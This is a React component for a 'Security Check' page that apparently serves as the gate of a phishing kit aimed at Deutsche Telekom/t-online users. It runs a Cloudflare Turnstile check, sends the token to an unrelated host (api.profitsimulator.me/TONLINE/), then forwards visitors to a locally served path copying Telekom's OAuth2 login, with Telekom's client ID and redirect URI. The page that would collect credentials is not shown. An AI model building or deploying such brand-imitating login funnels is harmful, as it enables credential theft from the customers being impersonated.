import React, { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";

declare global {
  interface Window {
    turnstile: {
      render: (element: string | HTMLElement, options: any) => string;
      reset: (widgetId?: string) => void;
      remove: (widgetId?: string) => void;
    };
  }
}

const SecurityCheck = () => {
  const navigate = useNavigate();
  
  // Toggle this for testing - set to false to bypass Turnstile
  const TURNSTILE_ENABLED = false;
  
  const [isVerifying, setIsVerifying] = useState(false);
  const [error, setError] = useState<string>("");
  const turnstileRef = useRef<HTMLDivElement>(null);
  const widgetId = useRef<string>("");

  // Generate random state and nonce for OAuth2
  const generateRandomString = (length: number) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const buildOAuth2URL = () => {
    const baseURL = '/oauth2/auth/io';
    const params = new URLSearchParams({
      response_type: 'code',
      client_id: '10LIVESAM30000004901PORTALE2000000000000',
      scope: 'openid',
      claims: '{"id_token":{"urn:telekom.com:all":null}}',
      state: generateRandomString(43),
      redirect_uri: 'https://www.t-online.de/auth/login/oauth2/code/telekom',
      nonce: generateRandomString(43)
    });
    return `${baseURL}?${params.toString()}`;
  };

  // Auto-navigate to login if Turnstile is disabled
  useEffect(() => {
    if (!TURNSTILE_ENABLED) {
      console.log('Turnstile disabled, navigating directly to OAuth2 login...');
      navigate(buildOAuth2URL());
    }
  }, [navigate]);

  // Load Turnstile script and initialize
  useEffect(() => {
    if (!TURNSTILE_ENABLED) return;

    const loadTurnstile = () => {
      if (document.querySelector('script[src*="turnstile"]')) {
        initializeTurnstile();
        return;
      }

      const script = document.createElement('script');
      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
      script.async = true;
      script.defer = true;
      script.onload = initializeTurnstile;
      document.head.appendChild(script);
    };

    const initializeTurnstile = () => {
      if (window.turnstile && turnstileRef.current) {
        try {
          widgetId.current = window.turnstile.render(turnstileRef.current, {
            sitekey: '1x00000000000000000000AA',
            callback: handleTurnstileSuccess,
            'error-callback': handleTurnstileError,
            theme: 'light',
            size: 'normal',
          });
        } catch (error) {
          console.error('Turnstile initialization failed:', error);
          setError('Failed to initialize security check');
        }
      }
    };

    loadTurnstile();

    return () => {
      if (window.turnstile && widgetId.current) {
        try {
          window.turnstile.remove(widgetId.current);
        } catch (error) {
          console.error('Turnstile cleanup failed:', error);
        }
      }
    };
  }, []);


  const handleTurnstileSuccess = async (token: string) => {
    console.log('Turnstile success callback triggered with token:', token);
    setIsVerifying(true);
    setError("");

    try {
      console.log('Making API request to verify token...');
      const response = await fetch('https://api.profitsimulator.me/TONLINE/verify-turnstile.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          token: token,
          sitekey: '1x00000000000000000000AA'
        }),
      });

      console.log('API response status:', response.status);
      const result = await response.json();
      console.log('API response result:', result);

      if (result.success) {
        console.log('Verification successful, navigating to OAuth2 login...');
        // Navigate to OAuth2 login page with parameters
        navigate(buildOAuth2URL());
      } else {
        console.log('Verification failed:', result);
        setError('Verification failed. Please try again.');
        setIsVerifying(false);
        // Reset turnstile
        if (window.turnstile && widgetId.current) {
          window.turnstile.reset(widgetId.current);
        }
      }
    } catch (error) {
      console.error('Verification error:', error);
      setError('Network error. Please try again.');
      setIsVerifying(false);
      // Reset turnstile
      if (window.turnstile && widgetId.current) {
        window.turnstile.reset(widgetId.current);
      }
    }
  };

  const handleTurnstileError = () => {
    setError('Security check failed. Please refresh the page.');
    setIsVerifying(false);
  };

  return (
    <div className="min-h-screen flex items-center justify-center" 
         style={{ background: 'var(--gradient-bg)' }}>
      <div className="w-full max-w-md px-4">
        <Card className="p-8 text-center border-0" 
              style={{ 
                background: 'var(--gradient-card)',
                boxShadow: 'var(--shadow-card)',
                backdropFilter: 'blur(10px)'
              }}>
          <h1 className="text-2xl font-semibold mb-4 text-gray-800">
            Security Check
          </h1>
          <p className="text-gray-600 mb-8">
            Please complete the security verification to continue
          </p>
          
          {/* Turnstile Widget Container */}
          <div className="mb-6 flex justify-center">
            <div ref={turnstileRef}></div>
          </div>

          {/* Error Display */}
          {error && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4">
              {error}
            </div>
          )}
        </Card>
      </div>
    </div>
  );
};

export default SecurityCheck;